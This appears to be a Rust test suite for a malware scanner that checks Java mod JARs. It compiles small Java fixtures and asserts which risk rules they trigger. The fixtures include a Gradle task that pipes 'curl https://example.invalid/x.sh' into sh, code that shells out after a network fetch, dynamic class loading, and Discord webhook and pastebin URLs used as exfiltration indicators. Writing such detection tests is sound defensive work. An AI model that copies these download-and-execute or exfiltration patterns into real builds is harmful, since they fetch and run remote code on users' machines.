//! Phase 8 malware-risk scan against real class files compiled with `javac`.
//! Skipped (with a message) when no JDK is installed.

use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::Command;
use ummp_core::scan::{scan_path, ScanReport, Severity};

fn have_javac() -> bool {
    Command::new("javac").arg("-version").output().is_ok()
}

/// Compiles `sources` (path, body) and returns the class files (entry name, bytes).
fn compile(sources: &[(&str, &str)]) -> Vec<(String, Vec<u8>)> {
    let dir = tempfile::tempdir().unwrap();
    let src = dir.path().join("src");
    let out = dir.path().join("out");
    let mut files = Vec::new();
    for (rel, body) in sources {
        let p = src.join(rel);
        fs::create_dir_all(p.parent().unwrap()).unwrap();
        fs::write(&p, body).unwrap();
        files.push(p);
    }
    let st = Command::new("javac")
        .arg("-d")
        .arg(&out)
        .args(&files)
        .output()
        .unwrap();
    assert!(
        st.status.success(),
        "{}",
        String::from_utf8_lossy(&st.stderr)
    );
    let mut classes = Vec::new();
    collect(&out, &out, &mut classes);
    classes
}

fn collect(root: &Path, dir: &Path, out: &mut Vec<(String, Vec<u8>)>) {
    for e in fs::read_dir(dir).unwrap() {
        let p = e.unwrap().path();
        if p.is_dir() {
            collect(root, &p, out);
        } else {
            let name = p
                .strip_prefix(root)
                .unwrap()
                .to_string_lossy()
                .replace('\\', "/");
            out.push((name, fs::read(&p).unwrap()));
        }
    }
}

fn jar_bytes(entries: &[(String, Vec<u8>)]) -> Vec<u8> {
    let mut buf = std::io::Cursor::new(Vec::new());
    {
        let mut z = zip::ZipWriter::new(&mut buf);
        for (name, bytes) in entries {
            z.start_file(name.as_str(), zip::write::SimpleFileOptions::default())
                .unwrap();
            z.write_all(bytes).unwrap();
        }
        z.finish().unwrap();
    }
    buf.into_inner()
}

fn jar(dir: &Path, entries: &[(String, Vec<u8>)]) -> PathBuf {
    let p = dir.join("demo.jar");
    fs::write(&p, jar_bytes(entries)).unwrap();
    p
}

fn descriptor() -> (String, Vec<u8>) {
    (
        "fabric.mod.json".into(),
        br#"{"schemaVersion":1,"id":"demowidget","version":"1.0.0"}"#.to_vec(),
    )
}

const CLEAN: &str =
    "package com.example.demo;\npublic class DemoWidget { public int size() { return 4; } }\n";

fn scan_jar(sources: &[(&str, &str)]) -> ScanReport {
    let d = tempfile::tempdir().unwrap();
    let mut entries = compile(sources);
    entries.push(descriptor());
    scan_path(&jar(d.path(), &entries)).unwrap()
}

fn has(r: &ScanReport, rule: &str, sev: Severity) -> bool {
    r.findings
        .iter()
        .any(|f| f.rule == rule && f.severity == sev)
}

#[test]
fn clean_jar_has_no_findings() {
    if !have_javac() {
        eprintln!("skipped: no javac");
        return;
    }
    let r = scan_jar(&[("com/example/demo/DemoWidget.java", CLEAN)]);
    assert!(r.findings.is_empty(), "{:?}", r.findings);
    assert_eq!(r.risk(), None);
    assert!(r.to_text().contains("not proof"));
}

#[test]
fn exec_with_network_is_high() {
    if !have_javac() {
        eprintln!("skipped: no javac");
        return;
    }
    let src = "package com.example.demo;\npublic class DemoWidget {\n\
        public void go() throws Exception {\n\
        new java.net.URL(\"https://example.invalid/p\").openStream();\n\
        Runtime.getRuntime().exec(new String[]{\"sh\"}); } }\n";
    let r = scan_jar(&[("com/example/demo/DemoWidget.java", src)]);
    assert!(
        has(&r, "exec-with-network", Severity::High),
        "{:?}",
        r.findings
    );
    assert_eq!(r.risk(), Some(Severity::High));
    let f = r
        .findings
        .iter()
        .find(|f| f.rule == "exec-with-network")
        .unwrap();
    assert_eq!(f.file, "com/example/demo/DemoWidget.class");
}

#[test]
fn defineclass_is_high() {
    if !have_javac() {
        eprintln!("skipped: no javac");
        return;
    }
    let src = "package com.example.demo;\npublic class DemoLoader extends ClassLoader {\n\
        public Class<?> load(byte[] b) { return defineClass(null, b, 0, b.length); } }\n";
    let r = scan_jar(&[("com/example/demo/DemoLoader.java", src)]);
    assert!(
        has(&r, "dynamic-class-loading", Severity::High),
        "{:?}",
        r.findings
    );
}

#[test]
fn webhook_url_is_high() {
    if !have_javac() {
        eprintln!("skipped: no javac");
        return;
    }
    let src = "package com.example.demo;\npublic class DemoWidget {\n\
        public static final String U = \"https://discord.com/api/webhooks/1/abc\"; }\n";
    let r = scan_jar(&[("com/example/demo/DemoWidget.java", src)]);
    assert!(
        has(&r, "exfiltration-url", Severity::High),
        "{:?}",
        r.findings
    );
}

#[test]
fn build_script_download_exec_is_high() {
    let d = tempfile::tempdir().unwrap();
    fs::write(
        d.path().join("build.gradle"),
        "plugins { id 'java' }\ntask setup(type: Exec) {\n  commandLine 'sh', '-c', 'curl https://example.invalid/x.sh | sh'\n}\n",
    )
    .unwrap();
    let r = scan_path(d.path()).unwrap();
    assert!(
        has(&r, "build-download-exec", Severity::High),
        "{:?}",
        r.findings
    );
    assert_eq!(r.findings[0].file, "build.gradle");
}

#[test]
fn nested_jar_is_scanned() {
    if !have_javac() {
        eprintln!("skipped: no javac");
        return;
    }
    let src = "package com.example.demo;\npublic class Hidden {\n\
        public static final String U = \"https://pastebin.com/raw/abc\"; }\n";
    let inner = jar_bytes(&compile(&[("com/example/demo/Hidden.java", src)]));
    let d = tempfile::tempdir().unwrap();
    let outer = jar(
        d.path(),
        &[descriptor(), ("META-INF/jars/inner.jar".into(), inner)],
    );
    let r = scan_path(&outer).unwrap();
    let f = r
        .findings
        .iter()
        .find(|f| f.rule == "exfiltration-url")
        .expect("nested finding");
    assert_eq!(
        f.file,
        "META-INF/jars/inner.jar!/com/example/demo/Hidden.class"
    );
}

#[test]
fn corrupt_class_does_not_abort() {
    if !have_javac() {
        eprintln!("skipped: no javac");
        return;
    }
    let src = "package com.example.demo;\npublic class DemoWidget {\n\
        public static final String U = \"https://discord.com/api/webhooks/1/abc\"; }\n";
    let mut entries = compile(&[("com/example/demo/DemoWidget.java", src)]);
    entries.insert(
        0,
        (
            "com/example/demo/Broken.class".into(),
            vec![0xCA, 0xFE, 0xBA, 0xBE, 0, 0, 0, 65, 0, 9, 1],
        ),
    );
    let d = tempfile::tempdir().unwrap();
    let r = scan_path(&jar(d.path(), &entries)).unwrap();
    assert!(
        has(&r, "unreadable-class", Severity::Low),
        "{:?}",
        r.findings
    );
    assert!(
        has(&r, "exfiltration-url", Severity::High),
        "{:?}",
        r.findings
    );
}

#[test]
fn native_lib_is_high() {
    let d = tempfile::tempdir().unwrap();
    let p = jar(
        d.path(),
        &[
            descriptor(),
            ("natives/demo.dll".into(), b"MZ\x90\x00".to_vec()),
        ],
    );
    let r = scan_path(&p).unwrap();
    assert!(
        has(&r, "native-library", Severity::High),
        "{:?}",
        r.findings
    );
}

#[test]
fn obfuscated_jar_is_medium() {
    if !have_javac() {
        eprintln!("skipped: no javac");
        return;
    }
    let body = "class a {} class b {} class c {} class d {} class e {} class f {}\n\
        class g {} class h {} class i {} class j {} class k {} class l {}\n";
    let r = scan_jar(&[("Z.java", body)]);
    assert!(has(&r, "obfuscation", Severity::Medium), "{:?}", r.findings);
    assert_eq!(r.risk(), Some(Severity::Medium));
}

#[test]
fn gradle_wrapper_jar_is_one_medium_finding() {
    if !have_javac() {
        eprintln!("skipped: no javac");
        return;
    }
    let src = "package org.gradle.wrapper;\npublic class Install {\n\
        public void go() throws Exception {\n\
        new java.net.URL(\"https://services.gradle.org/x\").openStream();\n\
        new ProcessBuilder(\"sh\").start(); } }\n";
    let d = tempfile::tempdir().unwrap();
    let wrapper = d.path().join("gradle/wrapper");
    fs::create_dir_all(&wrapper).unwrap();
    fs::write(
        wrapper.join("gradle-wrapper.jar"),
        jar_bytes(&compile(&[("org/gradle/wrapper/Install.java", src)])),
    )
    .unwrap();
    let r = scan_path(d.path()).unwrap();
    assert_eq!(r.findings.len(), 1, "{:?}", r.findings);
    assert_eq!(r.findings[0].rule, "gradle-wrapper");
    assert_eq!(r.risk(), Some(Severity::Medium));
    // The same JAR anywhere else is inspected normally.
    fs::rename(
        wrapper.join("gradle-wrapper.jar"),
        d.path().join("libs.jar"),
    )
    .unwrap();
    assert_eq!(scan_path(d.path()).unwrap().risk(), Some(Severity::High));
}
